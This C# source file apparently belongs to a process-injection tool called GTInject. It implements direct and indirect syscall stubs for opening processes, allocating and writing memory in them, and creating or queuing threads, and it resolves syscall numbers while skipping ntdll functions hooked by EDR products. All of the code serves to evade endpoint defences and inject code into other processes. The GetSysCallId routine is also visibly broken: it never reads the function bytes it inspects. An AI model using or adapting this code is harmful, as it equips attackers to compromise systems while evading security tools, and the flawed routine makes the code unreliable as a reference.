using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace GTInject.SysCalls
{
    internal class Syscalls
    {

        static IntPtr ntdllBaseAddress = IntPtr.Zero;

        /// Gets the base address of ntdll.dll
        public static IntPtr NtDllBaseAddress
        {
            get
            {
                if (ntdllBaseAddress == IntPtr.Zero)
                    ntdllBaseAddress = GetNtdllBaseAddress();
                return ntdllBaseAddress;
            }
        }

        static byte[] bDirectSysCallStub =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x26, 0x00, 0x00, 0x00,   // mov eax, 0x26 (NtOpenProcess Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        //https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp
        // ^ GOLD

        static byte[] bIndirectSysCallStub =
        {
            0x4C, 0x8B, 0xD1,               			                // mov r10, rcx
	        0xB8, 0x18, 0x00, 0x00, 0x00,    	              	        // mov eax, syscall number
	        0x49, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // movabs r11,syscall address
	        0x41, 0xFF, 0xE3 				       	                    // jmp r11
        };

        // Review if the RWX here matters - could see about RX changes if that would be better / possible, step through this. 
        public static WinNative.NTSTATUS SysclNtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref SysCalls.WinNative.OBJECT_ATTRIBUTES ObjectAttributes, ref SysCalls.WinNative.CLIENT_ID ClientId)
        {
            // dynamically resolve the syscall
            byte[] syscall = bDirectSysCallStub;
            syscall[4] = GetSysCallId("NtOpenProcess");

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!SysCalls.WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtOpenProcess assembledFunction = (Delegates.DelgNtOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtOpenProcess));

                    return (WinNative.NTSTATUS)assembledFunction(ref ProcessHandle, AccessMask, ref ObjectAttributes, ref ClientId);
                }
            }
        }

        public static SysCalls.WinNative.NTSTATUS SysclNtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionZize, UInt32 AllocationType, UInt32 Protect)
        {
            // dynamically resolve the syscall
            byte[] syscall = bDirectSysCallStub;
            syscall[4] = GetSysCallId("NtAllocateVirtualMemory");

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!SysCalls.WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)SysCalls.WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtAllocateVirtualMemory assembledFunction = (Delegates.DelgNtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtAllocateVirtualMemory));

                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionZize, AllocationType, Protect);
                }
            }
        }

        public static SysCalls.WinNative.NTSTATUS SysclNtWriteVirtualMemory(IntPtr hProcess, IntPtr baseAddress, IntPtr buffer, UInt32 Length, ref UInt32 bytesWritten)
        {
            // dynamically resolve the syscall
            byte[] syscall = bDirectSysCallStub;
            syscall[4] = GetSysCallId("NtWriteVirtualMemory");


            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtWriteVirtualMemory assembledFunction = (Delegates.DelgNtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtWriteVirtualMemory));

                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(hProcess, baseAddress, buffer, (uint)Length, ref bytesWritten);
                }
            }
        }

        public static SysCalls.WinNative.NTSTATUS SysclNtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect)
        {
            // dynamically resolve the syscall
            byte[] syscall = bDirectSysCallStub;
            syscall[4] = GetSysCallId("NtProtectVirtualMemory");

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtProtectVirtualMemory assembledFunction = (Delegates.DelgNtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtProtectVirtualMemory));

                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(ProcessHandle, ref BaseAddress, ref RegionSize, NewProtect, ref OldProtect);
                }
            }
        }

        public static SysCalls.WinNative.NTSTATUS SysclNtCreateThreadEx(out IntPtr threadHandle, WinNative.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
        {
            // dynamically resolve the syscall
            byte[] syscall = bDirectSysCallStub;
            syscall[4] = GetSysCallId("NtCreateThreadEx");

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtCreateThreadEx assembledFunction = (Delegates.DelgNtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtCreateThreadEx));

                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(out threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits, sizeOfStack, maximumStackSize, attributeList);
                }
            }
        }


        public static SysCalls.WinNative.NTSTATUS IndirectSysclNtCreateThreadEx(out IntPtr threadHandle, WinNative.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
        {
            Console.WriteLine("attach debugger");
            Console.ReadLine();
            // dynamically resolve the syscall
            byte[] syscall = bIndirectSysCallStub;
            IntPtr syscallMemAddr;
            (syscall[4],syscallMemAddr) = GetIndirectSysCall("NtCreateThreadEx");
            var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
            Console.WriteLine(syscallmemstring);
            byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
            byte[] syscallInstructionPrefix = new byte[2] { 0x00, 0x00 };
            byte[] syscallInstruction = new byte[syscallInstructionPrefix.Length + syscallInstructionSuffix.Length];
            System.Buffer.BlockCopy(syscallInstructionPrefix, 0, syscallInstruction, 0, syscallInstructionPrefix.Length);
            System.Buffer.BlockCopy(syscallInstructionSuffix, 0, syscallInstruction, syscallInstructionPrefix.Length, syscallInstructionSuffix.Length);
            Console.WriteLine(ByteArrayToString(syscallInstruction));
            Array.Reverse(syscallInstruction, 0, syscallInstruction.Length);
            System.Buffer.BlockCopy(syscallInstruction, 0, syscall, 10, syscallInstruction.Length);
            Console.WriteLine(ByteArrayToString(syscall));

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtCreateThreadEx assembledFunction = (Delegates.DelgNtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtCreateThreadEx));

                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(out threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits, sizeOfStack, maximumStackSize, attributeList);
                }
            }
        }

        public static SysCalls.WinNative.NTSTATUS SysclNtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, UInt32 ApcRoutineContext, IntPtr ApcStatusBlock, Int32 ApcReserved)
        {
            // dynamically resolve the syscall
            byte[] syscall = bDirectSysCallStub;
            syscall[4] = GetSysCallId("NtQueueApcThread");

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtQueueApcThread assembledFunction = (Delegates.DelgNtQueueApcThread)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtQueueApcThread));

                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(ThreadHandle, ApcRoutine, ApcRoutineContext, ApcStatusBlock, ApcReserved);
                }
            }
        }

        public static SysCalls.WinNative.NTSTATUS SysclNtResumeThread(IntPtr hThread, uint dwSuspendCount)
        {
            // dynamically resolve the syscall
            byte[] syscall = bDirectSysCallStub;
            syscall[4] = GetSysCallId("NtResumeThread");

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtResumeThread assembledFunction = (Delegates.DelgNtResumeThread)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtResumeThread));

                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(hThread, dwSuspendCount);
                }
            }
        }

        private static IntPtr GetNtdllBaseAddress()
        {
            Process hProc = Process.GetCurrentProcess();

            foreach (ProcessModule m in hProc.Modules)
            {
                if (m.ModuleName.ToUpper().Equals("NTDLL.DLL"))
                {
                    return m.BaseAddress;
                }
            }

            // we can't find the base address
            return IntPtr.Zero;
        }

        public static byte GetSysCallId(string FunctionName)
        {
            // first get the proc address
            IntPtr funcAddress = WinNative.GetProcAddress(NtDllBaseAddress, FunctionName);

            byte count = 0;

            // loop until we find an unhooked function
            while (true)
            {
                // is the function hooked - we are looking for the 0x4C, 0x8B, 0xD1, instructions - this is the start of a syscall
                bool hooked = false;

                var instructions = new byte[5];
                // Edited to the 4th byte - found some EDRs jmp after the initial mov r10, rcx, should consider that hooked
                if (!StructuralComparisons.StructuralEqualityComparer.Equals(new byte[4] { instructions[0], instructions[1], instructions[2], instructions[3] }, new byte[4] { 0x4C, 0x8B, 0xD1, 0xB8 }))
                {
                    hooked = true;
                }

                if (!hooked)
                {
                    Console.WriteLine("     Syscall ID dynamically resolved {1} to {0:X2}", (byte)(instructions[4] - count), FunctionName);
                    return (byte)(instructions[4] - count);
                }

                funcAddress = (IntPtr)((UInt64)funcAddress + ((UInt64)32));
                count++;
            }
        }


        public static (byte, IntPtr) GetIndirectSysCall(string FunctionName)
        {
            byte[] syscall_code = { 0x0f, 0x05, 0xc3 };
            UInt32 distance_to_syscall = 0x12;


            // first get the proc address
            IntPtr funcAddress = WinNative.GetProcAddress(NtDllBaseAddress, FunctionName);

            byte count = 0;

            // loop until we find an unhooked function
            while (true)
            {
                // is the function hooked - we are looking for the 0x4C, 0x8B, 0xD1, instructions - this is the start of a syscall
                bool hooked = false;

                var instructions = new byte[5];
                Marshal.Copy(funcAddress, instructions, 0, 5);
                // Edited to the 4th byte - found some EDRs jmp after the initial mov r10, rcx, should consider that hooked
                if (!StructuralComparisons.StructuralEqualityComparer.Equals(new byte[4] { instructions[0], instructions[1], instructions[2], instructions[3] }, new byte[4] { 0x4C, 0x8B, 0xD1, 0xB8 }))
                {
                    hooked = true;
                }

                if (!hooked)
                {
                    byte sysId = (byte)(instructions[4] - count);
                    Console.WriteLine("     Syscall ID dynamically resolved {1} to {0:X2}", sysId, FunctionName);
                    IntPtr syscallInstruction = (IntPtr)((UInt64)funcAddress + (UInt64)distance_to_syscall);
                    Console.WriteLine("Syscall instruction address " + syscallInstruction);
                    return (sysId, syscallInstruction);
                }

                funcAddress = (IntPtr)((UInt64)funcAddress + ((UInt64)32));
                count++;
            }
        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }
        public static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }
        struct Delegates
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref WinNative.OBJECT_ATTRIBUTES ObjectAttributes, ref WinNative.CLIENT_ID ClientId);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionZize, UInt32 AllocationType, UInt32 Protect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtWriteVirtualMemory(IntPtr hProcess, IntPtr baseAddress, IntPtr buffer, UInt32 Length, ref UInt32 bytesWritten);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtCreateThreadEx(out IntPtr threadHandle, WinNative.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, UInt32 ApcRoutineContext, IntPtr ApcStatusBlock, Int32 ApcReserved);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtResumeThread(IntPtr hThread, uint dwSuspendCount);

        };

    }
}
